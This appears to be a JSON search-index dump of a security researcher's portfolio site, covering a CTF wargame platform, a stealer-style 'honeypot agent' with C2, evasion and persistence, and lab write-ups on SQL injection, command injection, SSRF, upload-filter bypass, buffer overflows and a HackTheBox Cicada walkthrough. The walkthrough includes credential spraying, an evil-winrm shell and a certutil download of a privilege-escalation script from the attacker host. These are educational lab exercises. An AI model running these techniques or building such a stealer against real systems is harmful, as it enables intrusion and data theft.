\u0026ldquo;Bravo\u0026rdquo; (Red Team / Boot-to-Root)":"Target: Vulnerable Docker containers (e.g., modified DVWA) exposed internally. Goal: Web Exploitation $rightarrow$ Reverse Shell $rightarrow$ Root Flag. Maintenance: Automated nightly reset scripts destroy and redeploy the containers to ensure a fresh environment for every session.","3-charlie-forensics--reversing#3. \u0026ldquo;Charlie\u0026rdquo; (Forensics \u0026amp; Reversing)":"Concept: Self-contained analysis tasks. Tooling: Custom access groups (e.g., tools-gef) grant access to debuggers like GDB/GEF or Radare2 only to specific users, keeping the environment clean. Infrastructure is hardened with UFW default-deny policies and Fail2Ban integration.","challenge-design-patterns#Challenge Design Patterns":"I standardized three distinct challenge archetypes to cover the full offensive spectrum:","hybrid-architecture#Hybrid Architecture":"Frontend: Containerized CTFd handling scoring and user registration. Backend: Hardened Ubuntu Server hosting live SSH challenges. Split-SSH Access Control: Port 22: Admin access only (Key-based). Port 2222: Player access (Password-based, restricted shell).","philosophy#Philosophy":"Bastion is designed around progressive scenario-based learning, mimicking the “OverTheWire” mechanic where Flag = Next Password. Unlike standard CTFs, the goal is not just to find a string, but to compromise the user account of the next level.","project-status-production#Project Status: [Production]":"Project Status: [Production]"},"title":"Bastion Wargames Platform"},"/projects/mantis-c2/":{"data":{"1-polymorphism--evasion#1. Polymorphism \u0026amp; Evasion":"Dynamic Builds: The Makefile generates a unique file hash for every build, evading hash-based signaling. Debug Stripping: Automatically removes DWARF tables and symbol information to complicate reverse engineering. Hidden Execution: Runs as a background process on Windows without flashing the console.","2-the-pillage-workflow#2. The \u0026ldquo;Pillage\u0026rdquo; Workflow":"I engineered a two-stage exfiltration process to optimize bandwidth:\nStage 1 (Recon): Grabs “Recent Files” and system info immediately upon connection. Stage 2 (Deep Dive): The pil_fil command allows operators to surgically extract specific extensions (e.g., .pdf, .docx) or directories.","3-persistence--self-destruct#3. Persistence \u0026amp; Self-Destruct":"Persistence: Modifies the Windows Registry Run keys for survival across reboots. Kill Switch: The quit command triggers a self-destruct routine, scrubbing the registry keys and deleting the agent binary from the disk.","code-snippet-makefile-logic#Code Snippet: Makefile Logic":"# Example of build automation for stealth build_stealer_windows: GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w -H=windowsgui\" -o dist/stealer.exe This tool is for educational research and authorized honeypot deployment only.","key-capabilities#Key Capabilities":"","overview#Overview":"This is a stealthy agent designed to let attackers “catch themselves.” When deployed on a honeypot, it mimics legitimate software while establishing a covert channel back to a custom Command \u0026 Control (C2) server.","project-status-research--active#Project Status: [Research / Active]":"Project Status: [Research / Active]","technical-architecture#Technical Architecture":"The system consists of three core components:\nThe Agent (stealer): A GUI-less Go payload that runs silently on the victim machine. The C2 (receiver): A Linux-based server managing multiple sessions and exfiltrated data. The Builder: A custom GUI tool to generate polymorphic payloads on demand."},"title":"Honeypot Agent"},"/projects/regional-threat-intel/":{"data":{"architecture#Architecture":"The system runs on a containerized microservices architecture:\nCore: Python-based collectors acting as API glue. Storage: PostgreSQL (threat_db) for structured IOC retention. Visualization: Grafana for real-time monitoring of active campaigns.","custom-collectors#Custom Collectors":"I developed independent services for specific intelligence vectors:\ncollector-news: Parses RSS feeds and scores articles based on regional keywords. collector-ioc-threatfox: Ingests technical indicators (IP/Hash) from ThreatFox. collector-otx: Polls AlienVault OTX for “pulses” related to specific APTs. collector-c2feeds: Automates the tracking of active Command \u0026 Control servers.","integration-cisco-stealthwatch#Integration: Cisco Stealthwatch":"To operationalize the data, I built a direct integration for network security tools.\nMethod: Created a read-only PostgreSQL user (stealthwatch_user) allowed to query the public schema. Impact: Allows the internal firewall/NDR to pull high-fidelity blocklists directly from the CTI database without manual export. Deployment is managed via Docker Compose. Source code includes a custom importer for historical MaxMind and OTX data.","project-status-production#Project Status: [Production]":"Project Status: [Production]","system-overview#System Overview":"The CTI Dashboard is a custom intelligence aggregation platform designed to combat alert fatigue. Unlike generic feeds, it filters specifically for APT groups and C2 infrastructure targeting a specific geographic region."},"title":"Regional CTI Dashboard"},"/research/":{"data":{"":"Engineering Log: The Mechanical Inevitability of Buffer Overflows A deep dive into stack mechanics. Why does writing data 'up' cause the stack to break 'down'? Re-learning memory from first principles. Research: Boolean \u0026 Logic-Based SQL Injection Bypassing authentication and retrieving hidden schema data using tautologies. Research: Bypassing Modern File Upload Filters A consolidated analysis of Content-Type spoofing, Path Traversal, and Blacklist evasion based on recent lab research. Research: OS Command Injection Execution Flow Technical analysis of shell operator injection in legacy Perl/CGI scripts. Research: Server-Side Request Forgery (SSRF) Mechanics Pivoting through application logic to access loopback administrative interfaces. HackTheBox Machine - Cicada"},"title":"Research"},"/research/bypassing-file-upload-filters/":{"data":{"":"","1-content-type-spoofing#1. Content-Type Spoofing":"Many applications validate the Content-Type header sent by the browser but fail to validate the actual file magic bytes.\nThe Flaw: The server trusts the client-side header image/jpeg but processes the file as PHP. The Bypass: Intercepting the request and changing Content-Type: text/plain to Content-Type: image/jpeg allows the upload of arbitrary code. Impact: Complete RCE if the server is configured to execute PHP in the upload directory.","2-path-traversal-in-filenames#2. Path Traversal in Filenames":"Servers often use the provided filename to determine the save location. If this input is not sanitized, it allows escaping the intended upload directory.\nTechnique: Modifying the filename parameter: Content-Disposition: form-data; name=\"avatar\"; filename=\"..%2Fmal.php\" Result: The file is saved to /files/mal.php instead of /files/avatars/mal.php, potentially bypassing .htaccess restrictions placed on the images folder.","3-blacklist-evasion--configuration-overrides#3. Blacklist Evasion \u0026amp; Configuration Overrides":"Blacklisting extensions (blocking .php) is notoriously difficult to maintain.\nApache .htaccess Override: If the server allows uploading .htaccess files, an attacker can redefine executable extensions. AddType application/x-httpd-php .hack Effect: Uploading a shell named shell.hack will now execute as PHP. Obfuscation: Using alternative extensions (.php5, .phtml) or casing (.pHp) often bypasses weak regex filters.","abstract#Abstract":"File upload vulnerabilities remain a critical vector for Remote Code Execution (RCE). While developers often implement validation mechanisms (MIME type checks, blacklists), these are frequently based on “trusting user input.” This report documents specific bypass techniques I analyzed during recent research.","conclusion#Conclusion":"Robust file upload security requires a defense-in-depth approach:\nRename files on the server (do not use user-provided names). Validate Magic Bytes, not just headers. Store uploads outside the web root or on a separate cloud bucket (S3)."},"title":"Research: Bypassing Modern File Upload Filters"},"/research/htb-cicada-analysis/":{"data":{"":"IP: 10.10.11.35\nNmap scan results for 10.10.11.35 machine. Parameters:\n`sV` - Probe open ports to determine service/version info ‘sC’ - equivalent to –script=default ‘Pn’ - Treat all hosts as online – skip host discovery ‘–max-rate=1000’ - Send packets no faster than 1000 packets per second nmap -sV -sC -Pn 10.10.11.35 --max-rate=1000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 10:22 +04 Nmap scan report for cicada.htb (10.10.11.35) Host is up (0.098s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-18 13:22:50Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u003cunsupported\u003e, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u003cunsupported\u003e, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 |_ssl-date: TLS randomness does not represent time 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u003cunsupported\u003e, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 |_ssl-date: TLS randomness does not represent time 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u003cunsupported\u003e, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-11-18T13:23:35 |_ start_date: N/A |_clock-skew: 6h59m59s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 96.30 seconds We find out that 10.10.11.35 host has cicada.htb domain. The system has active SMB, LDAP, RPC over HTTP services enabled, which can be further studied and dissected for weaknesses and vulnerabilities. Listing NULL(unauthorized/anonymous) SMB SHARES\n\u003e smbclient --no-pass -L //10.10.11.35 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share DEV Disk HR Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share After that I tried logging into these SMB shares. HR share was accessible without authorization and had a content inside.\n\u003e smbclient //10.10.11.35/HR -U \" \"%\" \" Try \"help\" to get a list of possible commands. smb: \\\u003e dir . D 0 Thu Mar 14 16:29:09 2024 .. D 0 Thu Mar 14 16:21:29 2024 Notice from HR.txt A 1266 Wed Aug 28 21:31:48 2024 \u003e smb: \\\u003e recurse ON \u003e smb: \\\u003e mget * Get file Notice from HR.txt? yes getting file \\Notice from HR.txt of size 1266 as Notice from HR.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec) The contents of the file `Notice From HR.txt` included a message from the HR notifying the new employee about their default password, although username was not mentioned.\nuser default password: Cicada$M6Corpb*@Lp#nZp!8\nnow i need to guess which user’s password is this.\nI’m going to enumerate users by Brute-forcing RID’s using NetExec tool\n\u003e nxc smb 10.10.11.35 -u guest -p '' --rid-brute OR \u003e nxc smb 10.10.11.35 -u none -p '' --rid-brute Both of the above produces the same result\nSMB 10.10.11.35 445 CICADA-DC [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) SMB 10.10.11.35 445 CICADA-DC [+] cicada.htb\\guest: SMB 10.10.11.35 445 CICADA-DC 498: CICADA\\Enterprise Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 500: CICADA\\Administrator (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 501: CICADA\\Guest (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 502: CICADA\\krbtgt (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 512: CICADA\\Domain Admins (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 513: CICADA\\Domain Users (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 514: CICADA\\Domain Guests (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 515: CICADA\\Domain Computers (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 516: CICADA\\Domain Controllers (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 517: CICADA\\Cert Publishers (SidTypeAlias) SMB 10.10.11.35 445 CICADA-DC 518: CICADA\\Schema Admins (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 519: CICADA\\Enterprise Admins (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 520: CICADA\\Group Policy Creator Owners (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 521: CICADA\\Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 522: CICADA\\Cloneable Domain Controllers (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 525: CICADA\\Protected Users (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 526: CICADA\\Key Admins (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 527: CICADA\\Enterprise Key Admins (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 553: CICADA\\RAS and IAS Servers (SidTypeAlias) SMB 10.10.11.35 445 CICADA-DC 571: CICADA\\Allowed RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.35 445 CICADA-DC 572: CICADA\\Denied RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.35 445 CICADA-DC 1000: CICADA\\CICADA-DC$ (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 1101: CICADA\\DnsAdmins (SidTypeAlias) SMB 10.10.11.35 445 CICADA-DC 1102: CICADA\\DnsUpdateProxy (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 1103: CICADA\\Groups (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 1104: CICADA\\john.smoulder (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 1105: CICADA\\sarah.dantelia (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 1106: CICADA\\michael.wrightson (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 1108: CICADA\\david.orelious (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 1109: CICADA\\Dev Support (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 1601: CICADA\\emily.oscars (SidTypeUser) Then i used AWK to get usernames separately for brute-forcing.\n\u003e cat enum_accs.txt | awk '{print $6}' \u003e users.txt \u003e cat users.txt | awk -F \"\\\\\" '{print $2}' \u003e usernames.txt Which produces\nguest: Enterprise Administrator Guest krbtgt Domain Domain Domain Domain Domain Cert Schema Enterprise Group Read-only Cloneable Protected Key Enterprise RAS Allowed Denied CICADA-DC$ DnsAdmins DnsUpdateProxy Groups john.smoulder sarah.dantelia michael.wrightson david.orelious Dev emily.oscars Next i pass enumerated users and known passwords and see which account matches this password\n\u003e nxc smb 10.10.11.35 -u enum_users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success michael.wrightson account was a match.\nThen we test user connection by listing network shares as an authorized user\n\u003e smbclient -L 10.10.11.35 -W cicada.htb -U michael.wrightson. And it works!\nThen, let’s go ahead and login to RPC client as an authorized user and see what we can do or act on.\nrpcclient 10.10.11.35 -U michael.wrightson%'Cicada$M6Corpb*@Lp#nZp!8' -W cicada.htb And we got access to RPC session as an authorized user.\nNow let’s enumerate available users and groups on the system\nrpcclient $\u003e enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[john.smoulder] rid:[0x450] user:[sarah.dantelia] rid:[0x451] user:[michael.wrightson] rid:[0x452] user:[david.orelious] rid:[0x454] user:[emily.oscars] rid:[0x641] rpcclient $\u003e enumdomgroups group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Admins] rid:[0x200] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Domain Controllers] rid:[0x204] group:[Schema Admins] rid:[0x206] group:[Enterprise Admins] rid:[0x207] group:[Group Policy Creator Owners] rid:[0x208] group:[Read-only Domain Controllers] rid:[0x209] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[Key Admins] rid:[0x20e] group:[Enterprise Key Admins] rid:[0x20f] group:[DnsUpdateProxy] rid:[0x44e] group:[Groups] rid:[0x44f] group:[Dev Support] rid:[0x455] After querying each user I came across david.orelious Description. It contains users comment, which contains the password of the user.\nrpcclient $\u003e queryuser david.orelious User Name :\tdavid.orelious Full Name :\tHome Drive :\tDir Drive :\tProfile Path:\tLogon Script:\tDescription :\tJust in case I forget my password is aRt$Lp#7t*VQ!3 Workstations:\tComment :\tRemote Dial : Logon Time :\tFri, 15 Mar 2024 10:32:22 +04 Logoff Time :\tThu, 01 Jan 1970 04:00:00 +04 Kickoff Time :\tThu, 14 Sep 30828 06:48:05 +04 Password last set Time :\tThu, 14 Mar 2024 16:17:30 +04 Password can change Time :\tFri, 15 Mar 2024 16:17:30 +04 Password must change Time:\tThu, 14 Sep 30828 06:48:05 +04 unknown_2[0..31]... user_rid :\t0x454 group_rid:\t0x201 acb_info :\t0x00000210 fields_present:\t0x00ffffff logon_divs:\t168 bad_password_count:\t0x00000000 logon_count:\t0x00000000 padding1[0..7]... logon_hrs[0..21]... Now, I can login to SMB DEV share with this account.\nsmbclient //10.10.11.35/DEV -U david.orelious%'aRt$Lp#7t*VQ!3' -W cicada.htb Once session is established, we can see the ps1 script present on the share.\nsmb: \\\u003e dir . D 0 Thu Mar 14 16:31:39 2024 .. D 0 Thu Mar 14 16:21:29 2024 Backup_script.ps1 A 601 Wed Aug 28 21:28:22 2024 4168447 blocks of size 4096. 431820 blocks available smb: \\\u003e get Backup_script.ps1 getting file \\Backup_script.ps1 of size 601 as Backup_script.ps1 (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec) Let’s examine Backup_script.ps1\n$username = \"emily.oscars\" $password = ConvertTo-SecureString \"Q!3@Lp#M6b*7t*Vt\" -AsPlainText -Force $credentials = New-Object System.Management.Automation.PSCredential($username, $password) $dateStamp = Get-Date -Format \"yyyyMMdd_HHmmss\" $backupFileName = \"smb_backup_$dateStamp.zip\" $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath Write-Host \"Backup completed successfully. Backup file saved to: $backupFilePath\" The script reveals another user’s information. Namely, emily.oscars password is Q!3@Lp#M6b*7t*Vt\nthen I logged into Emily’s user account in SMB\nsmbclient //10.10.11.35/C$ -U emily.oscars%'Q!3@Lp#M6b*7t*Vt' -W cicada.htb and retrieved an user.txt flag from\nC:\\Users\\emily.oscars.CICADA\\Desktop\\user.txt\nUp until this point I got by without any help. Then I got stuck and looked up other people’s approaches.\nI got remote interactive shell access with evil-winrm to emily’s user account.\nevil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' I found out that emily.oscars has a permission SeBackupPrivilege which can be used to gain read access on any file on the system.\nhere’s a script that allows just that: https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1\nThen I got this script uploaded to emily’s workstation, which was hosted on my machine using python HTTP server.\ncertutil -urlcache -f http://10.10.14.167/privesc.ps1 privesc.ps1 Last step is to activate the script and read administrator folder.\n*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Desktop\u003e . ./privesc.ps1 *Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Desktop\u003e Acl-FullControl -user cicada\\emily.oscars -path C:\\users\\administrator\\desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e cat root.txt user.txt - Acquired root.txt - Acquired\nCicada machine has been pwned."},"title":"HackTheBox Machine - Cicada"},"/research/os-command-injection-patterns/":{"data":{"":"","assessment-case-study#Assessment Case Study":"Target Endpoint: /product/stock Method: POST\nDuring analysis, I intercepted a stock check request. The backend expected a numeric productId.\nInjected Payload:\nproductId=1 \u0026 whoami \u0026 storeId=1 Execution Flow on Server:\nstockreport.pl 1 (Executed successfully) whoami (Injected command executed) 1 (Remaining argument treated as command, likely failed) Raw HTTP Response:\nHTTP/2 200 OK Content-Type: text/plain; charset=utf-8 peter-3vyaW3 The response confirmed code execution by returning the current user context (peter-3vyaW3) alongside the standard application output.","injection-context#Injection Context":"Legacy applications often interface with the operating system using shell wrappers. A common pattern observed in inventory systems involves passing user IDs directly to backend scripts.\nVulnerable Logic:\nstockreport.pl If the application fails to sanitize productID, the shell’s command separator logic can be abused to chain execution.","shell-operator-chaining#Shell Operator Chaining":"The success of an injection depends on how the underlying shell interprets control operators:\n\u0026 (Background): Executes the preceding command and immediately moves to the next. ; (Sequence): Executes commands strictly sequentially (Linux only). || (OR): Executes the second command only if the first fails."},"title":"Research: OS Command Injection Execution Flow"},"/research/sql-injection-patterns/":{"data":{"":"","1-authentication-bypass-via-comment-injection#1. Authentication Bypass via Comment Injection":"Login mechanisms frequently construct queries by concatenating user input directly into a string.\nBackend Logic:\nSELECT * FROM users WHERE username = '$user' AND password = '$pass' Injection Vector: By appending the SQL comment sequence (--), we can truncate the query immediately after the username, effectively removing the password validation requirement.\nPayload: administrator'--\nResulting Query:\nSELECT * FROM users WHERE username = 'administrator'--' AND password = '...' The database engine interprets this as a valid query for the user “administrator”, ignoring the remainder of the string.","2-boolean-inference-hidden-data-retrieval#2. Boolean Inference (Hidden Data Retrieval)":"Applications often use hidden flags (e.g., released = 1) to filter content. We can override these filters using Boolean tautologies.\nTarget Request:\nGET /filter?category=Pets HTTP/2 Backend Query:\nSELECT * FROM products WHERE category = 'Pets' AND released = 1 Injection Payload:\nGET /filter?category=Pets'+OR+1=1--' HTTP/2 Execution Logic:\nSELECT * FROM products WHERE category = 'Pets' OR 1=1--' AND released = 1 Since 1=1 evaluates to TRUE for every row in the table, the database returns the entire dataset, including unreleased or internal items. This technique effectively dumps the table without requiring a UNION attack."},"title":"Research: Boolean \u0026 Logic-Based SQL Injection"},"/research/ssrf-exploitation/":{"data":{"":"","escalation-authorized-action#Escalation: Authorized Action":"Once the internal interface is accessible, we can construct authorized requests by predicting URL structures.\nPayload:\nstockApi=http://localhost/admin/delete?username=carlos The server executes the request with local privileges, deleting the target user. This demonstrates how SSRF bypasses network-level access controls (firewalls) by utilizing the trusted server as a proxy.","exploitation-localhost-pivot#Exploitation: Localhost Pivot":"By modifying the stockApi parameter, we can direct the server to query its own loopback interface (127.0.0.1). This is critical because many administrative services listen only on localhost to avoid external exposure.\nPayload:\nstockApi=http://localhost/admin Result: The server responds with the Administrative Interface HTML, which is normally blocked from external IPs.","mechanism-of-action#Mechanism of Action":"SSRF occurs when an application fetches a remote resource based on user-supplied URLs without validation. This trust relationship allows an attacker to coerce the server into making requests on their behalf.","target-analysis-stock-api#Target Analysis: Stock API":"The application uses a specific parameter to query an internal stock management API:\nPOST /product/stock HTTP/1.0 ... stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1"},"title":"Research: Server-Side Request Forgery (SSRF) Mechanics"},"/research/stack-mechanics-and-overflows/":{"data":{"":"","1-the-stage-stack-vs-heap#1. The Stage: Stack vs. Heap":"The first hurdle was visualizing memory correctly. We often say “Stack and Heap,” but they are essentially opposites in behavior.\nThe Heap (The Warehouse): This is where you manually ask for space (malloc). It grows UP (from low memory addresses to high ones). It’s messy, flexible, and persistent. The Stack (The Workbench): This is where the CPU does its immediate work. It is automatic, strictly ordered, and—crucially—it grows DOWN (from high memory addresses to low ones). This “downward growth” is the key. When a function needs space for variables, it doesn’t “add” memory. It subtracts from the Stack Pointer to carve out a scratchpad. When the two overlap, that’s when the memory is said to be “exhausted”.","2-the-choreography-of-rsp#2. The Choreography of RSP":"The Stack Pointer (RSP) isn’t just a cursor; it is the boundary line.\nEverything above RSP (Higher Addresses) is “Saved Data” (things we want to keep, like return addresses). Everything below RSP (Lower Addresses) is “Volatile Space” (garbage memory waiting to be used). When we execute instructions, we are just moving this boundary line.","3-the-conflict-writing-vs-allocating#3. The Conflict: Writing vs. Allocating":"To understand the failure, look at this simple C program:\nint func() { char buffer[8]; // The vulnerability lives here return 0xbeef; } int main() { func(); return 0xfeeb; } When main calls func(), the following mechanical steps happen at the Assembly level:\ncall func — Initiating a CALL does two things. First, it executes PUSH RIP. It takes the next instruction address (the one after the call) and pushes it onto the stack. This is the Saved Return Address. Then, it executes JMP func to “teleport” the CPU to the function. sub rsp, 28h — Inside func, the Stack Pointer (RSP) moves DOWN. Subtracting in this context means moving the RSP to a lower memory address—essentially freeing up space for our buffer and other operations. The Write Operation — This is where the user input happens (e.g., strcpy or gets). RET — When func() is finished, it executes RET. This instruction does one simple thing: POP RIP. It looks at the top of the stack, takes the value sitting there (which should be the Saved Return Address), and jams it into the Instruction Pointer (RIP).","4-the-blind-trust-of-ret#4. The Blind Trust of \u003ccode\u003eRET\u003c/code\u003e":"When the function finishes, it executes RET. This is the moment the exploit triggers.\nRET is a mechanical instruction. It does exactly one thing:\nIt looks at where RSP is pointing. It takes the value sitting there. It jams that value into the Instruction Pointer (RIP). The logic flaw is simple: RET does not check what it is popping. It assumes that because the value was on the stack, it must be valid.\nIf we managed to overwrite that slot with 0xDEADBEEF, the CPU doesn’t see “garbage data.” It sees “The address I must go to next.”\nIt blindly jumps to 0xDEADBEEF.","allocation-is-subtraction#Allocation is Subtraction":"In high-level languages, we declare variables. In Assembly, we just move the line.\nSUB RSP, 0x20: This creates a 32-byte buffer. We didn’t “create” anything; we just slid the RSP down 32 bytes and said, “This space is now mine.” ADD RSP, 0x20: This “frees” the buffer. We slide the RSP back up. The data is technically still there, but it is now in the “Volatile” zone, ready to be overwritten by the next function.","conclusion#Conclusion":"Buffer overflows aren’t magic. They are the result of a mechanical collision between two opposing forces: the stack allocating downwards, and data writing upwards.\nTo hijack execution, we don’t need to “hack” the software logic. We just need to replace the top of the stack with our own address, and wait for the CPU to blindly follow instructions.","the-black-box-problem#The \u0026ldquo;Black Box\u0026rdquo; Problem":"For a long time, I treated assembly instructions like black boxes. I knew that CALL started a function and RET ended it. I knew that if I threw enough “A\"s at a buffer, the program would crash.\nBut I didn’t understand the mechanics of the crash. I didn’t understand why the CPU—a machine built for precision—would so easily confuse my user input for a code address.\nTo fix this, I had to stop looking at the code and start looking at the Stack Pointer (RSP).","the-mechanical-failure#The Mechanical Failure":"This is the specific realization that made everything click for me. There is a fundamental conflict in direction:\nThe Stack grows DOWN: We allocate space by moving RSP to Lower Addresses. Buffers write UP: When we write data into an array (like “Hello”), we write from the start (Low Address) to the end (High Address). If we visualize the memory during the “Write Operation”, the collision becomes obvious.\nMemory Layout on Stack (High to Low Addresses):\n[ 0x00007fffffffe018 ] \u003c-- Saved Return Address (Pushed by CALL) [ 0x00007fffffffe010 ] \u003c-- Old Base Pointer (Saved RBP) [ 0x00007fffffffe000 ] \u003c-- Start of 'buffer' (RSP is here) If we write 8 bytes (“ABCDEFGH”), we fill the buffer perfectly up to 0x...008. But if we write input code that is longer than 16 bytes:\nInput: \"AAAAAAAAAAAAAAAA\" + \"BBBBBBBB\" + \"DEADBEEF\" The write operation starts at the bottom and climbs UP:\n“AAAAAAAAAAAAAAAA” fills the buffer and the padding. “BBBBBBBB” overwrites the Old Base Pointer. “DEADBEEF” overwrites the Saved Return Address. When RET executes, it doesn’t know the stack was corrupted. It just pops 0xDEADBEEF into RIP, and execution jumps to our malicious address at 0xDEADBEEF"},"title":"Engineering Log: The Mechanical Inevitability of Buffer Overflows"}}